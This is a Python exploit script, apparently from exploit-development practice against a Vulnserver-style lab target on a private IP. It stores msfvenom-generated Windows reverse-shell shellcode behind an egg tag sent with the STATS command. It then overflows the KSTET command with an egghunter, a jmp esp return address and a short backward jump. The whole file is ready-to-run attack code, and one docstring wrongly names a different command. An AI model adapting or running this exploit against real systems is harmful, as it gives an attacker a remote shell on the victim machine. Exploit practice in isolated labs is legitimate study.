#!/usr/bin/python3

import socket
import struct


def add_shellcode() -> bytes:
    # msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread -b "\x00" -f c LHOST=eth0 LPORT=4444
    # Payload size: 351 bytes
    # Final size of c file: 1500 bytes
    shellcode = b""
    shellcode += b"\xdb\xd8\xd9\x74\x24\xf4\x5b\x33\xc9\xbf\xbf\xfb\x4f\xab\xb1"
    shellcode += b"\x52\x31\x7b\x17\x83\xc3\x04\x03\xc4\xe8\xad\x5e\xc6\xe7\xb0"
    shellcode += b"\xa1\x36\xf8\xd4\x28\xd3\xc9\xd4\x4f\x90\x7a\xe5\x04\xf4\x76"
    shellcode += b"\x8e\x49\xec\x0d\xe2\x45\x03\xa5\x49\xb0\x2a\x36\xe1\x80\x2d"
    shellcode += b"\xb4\xf8\xd4\x8d\x85\x32\x29\xcc\xc2\x2f\xc0\x9c\x9b\x24\x77"
    shellcode += b"\x30\xaf\x71\x44\xbb\xe3\x94\xcc\x58\xb3\x97\xfd\xcf\xcf\xc1"
    shellcode += b"\xdd\xee\x1c\x7a\x54\xe8\x41\x47\x2e\x83\xb2\x33\xb1\x45\x8b"
    shellcode += b"\xbc\x1e\xa8\x23\x4f\x5e\xed\x84\xb0\x15\x07\xf7\x4d\x2e\xdc"
    shellcode += b"\x85\x89\xbb\xc6\x2e\x59\x1b\x22\xce\x8e\xfa\xa1\xdc\x7b\x88"
    shellcode += b"\xed\xc0\x7a\x5d\x86\xfd\xf7\x60\x48\x74\x43\x47\x4c\xdc\x17"
    shellcode += b"\xe6\xd5\xb8\xf6\x17\x05\x63\xa6\xbd\x4e\x8e\xb3\xcf\x0d\xc7"
    shellcode += b"\x70\xe2\xad\x17\x1f\x75\xde\x25\x80\x2d\x48\x06\x49\xe8\x8f"
    shellcode += b"\x69\x60\x4c\x1f\x94\x8b\xad\x36\x53\xdf\xfd\x20\x72\x60\x96"
    shellcode += b"\xb0\x7b\xb5\x39\xe0\xd3\x66\xfa\x50\x94\xd6\x92\xba\x1b\x08"
    shellcode += b"\x82\xc5\xf1\x21\x29\x3c\x92\x8d\x06\x5d\x01\x66\x55\xa1\xd4"
    shellcode += b"\x2a\xd0\x47\xbc\xc2\xb4\xd0\x29\x7a\x9d\xaa\xc8\x83\x0b\xd7"
    shellcode += b"\xcb\x08\xb8\x28\x85\xf8\xb5\x3a\x72\x09\x80\x60\xd5\x16\x3e"
    shellcode += b"\x0c\xb9\x85\xa5\xcc\xb4\xb5\x71\x9b\x91\x08\x88\x49\x0c\x32"
    shellcode += b"\x22\x6f\xcd\xa2\x0d\x2b\x0a\x17\x93\xb2\xdf\x23\xb7\xa4\x19"
    shellcode += b"\xab\xf3\x90\xf5\xfa\xad\x4e\xb0\x54\x1c\x38\x6a\x0a\xf6\xac"
    shellcode += b"\xeb\x60\xc9\xaa\xf3\xac\xbf\x52\x45\x19\x86\x6d\x6a\xcd\x0e"
    shellcode += b"\x16\x96\x6d\xf0\xcd\x12\x8d\x13\xc7\x6e\x26\x8a\x82\xd2\x2b"
    shellcode += b"\x2d\x79\x10\x52\xae\x8b\xe9\xa1\xae\xfe\xec\xee\x68\x13\x9d"
    shellcode += b"\x7f\x1d\x13\x32\x7f\x34"
    return shellcode

def add_pattern() -> bytes:
    """Reads pattern file and returns bytes"""
    with open("pattern_1k.txt") as in_file:
        pattern = in_file.readline()
    return bytes(pattern, "utf-8")

def build_buf(shellcode: bytes = b"") -> bytes:
    """Builds buffer for GMON exploit"""
    # bad chars: \x00
    # **************
    # Buffer Layout
    # **************
    # 
    # KSTET
    # EIP overwrite @ 70 bytes
    # 26 bytes to egghunter
    # 32 byte egghunter flopflop
    # fill to 70 byte EIP overwrite
    #   0x625011af : jmp esp
    # jump back 50 bytes to egghunter
    # fill to 1000 bytes

    buf = b"A" * 26
    buf += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    buf += b"\xef\xb8\x66\x6c\x6f\x70\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
    buf += b"B" * (70 - len(buf))
    buf += struct.pack("<L", 0x625011af)
    buf += b"\xeb\xce"
    buf += b"\x90" * (1000 - len(buf))
    return buf


def send_exploit(ip: str, port: int) -> None:
    """Sends exploit"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((ip, port))
        print(sock.recv(1024).decode())
    except Exception as e:
        print(e)
        exit()

    # no room in KSTET for shellcode, send in STATS w/ egg
    sock.send(b"STATS flopflop" + add_shellcode())
    sock.recv(1024)
    sock.settimeout(5)
    sock.send(b"KSTET " + build_buf())
    try:
        print(sock.recv(1024))
    except socket.timeout:
        pass
    finally:
        sock.close()

if __name__ == "__main__":
    send_exploit("192.168.99.100", 9999)